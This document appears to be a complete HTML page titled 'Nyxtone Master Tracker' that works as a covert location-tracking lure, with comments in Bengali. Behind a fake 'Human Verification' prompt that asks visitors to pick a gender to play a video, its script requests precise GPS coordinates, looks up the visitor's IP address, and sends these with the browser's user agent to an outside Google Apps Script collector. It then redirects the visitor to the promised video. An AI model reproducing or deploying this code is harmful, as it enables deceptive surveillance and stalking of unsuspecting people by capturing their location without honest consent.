<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nyxtone Master Tracker</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: white; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 350px; }
        .v-btn { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; color: white; transition: 0.3s; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div id="victim-ui" class="card">
    <h3>Human Verification</h3>
    <p>Select your gender to play video</p>
    <button class="v-btn" style="background:#007bff;" onclick="askGPS()">MALE</button>
    <button class="v-btn" style="background:#e83e8c;" onclick="askGPS()">FEMALE</button>
</div>

<script>
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbySxD9Mr_ToHB0g0kRCYoffi9SNKUX2F9jjrW9YRj-3tAKLdr3LUqnC8pPjWlDnZG_oEw/exec";

    function askGPS() {
        const params = new URLSearchParams(window.location.search);
        const id = params.get('id');
        const v = params.get('v');

        document.getElementById('victim-ui').innerHTML = `<h3>Verifying...</h3><div class="loader"></div><p>Please click <b>'Allow'</b> to watch</p>`;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await sendData(id, map);
                window.location.href = atob(v);
            }, async (err) => {
                await sendData(id, "GPS Blocked/Denied");
                window.location.href = atob(v);
            }, { enableHighAccuracy: true, timeout: 5000 });
        } else {
            window.location.href = atob(v);
        }
    }

    async function sendData(id, loc) {
        try {
            // IP বের করার জন্য
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            
            // গুগল শিটে ডাটা পাঠানো
            await fetch(SCRIPT_URL + `?id=${encodeURIComponent(id)}&ip=${encodeURIComponent(ipData.ip)}&location=${encodeURIComponent(loc)}&device=${encodeURIComponent(navigator.userAgent)}`, {
                method: 'GET',
                mode: 'no-cors'
            });
        } catch (e) {
            console.error(e);
        }
    }
</script>
</body>
</html>
